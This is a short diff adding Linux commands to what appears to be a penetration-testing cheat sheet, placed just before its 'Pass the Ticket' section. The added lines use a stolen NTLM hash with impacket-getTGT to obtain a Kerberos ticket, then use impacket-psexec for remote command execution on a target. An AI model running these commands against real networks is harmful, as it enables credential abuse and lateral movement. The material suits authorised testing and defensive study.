@@ -74,6 +74,13 @@ klist
 
 # access the resource
 dir \\<target>\C$
+
+# linux
+impacket-getTGT <domain>/<user> -hashes ":<hash>"
+export KRB5CCNAME=<ticket>.ccache
+
+# access the machine
+impacket-psexec <domain>/<user>@<ip> -k -no-pass
 ```
 
 ## Pass the Ticket
